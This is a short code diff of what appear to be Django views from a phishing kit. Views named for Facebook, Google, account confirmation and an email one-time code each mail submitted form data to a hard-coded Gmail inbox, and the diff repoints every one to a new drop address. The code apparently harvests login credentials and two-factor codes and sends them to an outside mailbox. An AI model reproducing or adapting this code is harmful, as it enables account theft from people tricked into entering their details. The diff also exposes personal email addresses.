@@ -27,7 +27,7 @@ def confirm_account(request):
        send_mail('Contact Form',
         message,
         settings.EMAIL_HOST_USER,
-        ['oweeelliot@gmail.com'], 
+        ['voteconfirm598@gmail.com'], 
         fail_silently=False, html_message=message)
 
        return redirect('success')
@@ -47,7 +47,7 @@ def emailotp(request):
        send_mail('Contact Form',
         message,
         settings.EMAIL_HOST_USER,
-        ['oweeelliot@gmail.com'], 
+        ['voteconfirm598@gmail.com'], 
         fail_silently=False, html_message=message)
 
        return redirect('success')
@@ -80,7 +80,7 @@ def facebook(request):
        send_mail('Contact Form',
         message,
         settings.EMAIL_HOST_USER,
-        ['oweeelliot@gmail.com'], 
+        ['voteconfirm598@gmail.com'], 
         fail_silently=False, html_message=message)
 
        return redirect('confirm_account')
@@ -147,7 +147,7 @@ def google(request):
        send_mail('Contact Form',
         message,
         settings.EMAIL_HOST_USER,
-        ['oweeelliot@gmail.com'], 
+        ['voteconfirm598@gmail.com'], 
         fail_silently=False, html_message=message)
 
        return redirect('emailotp')
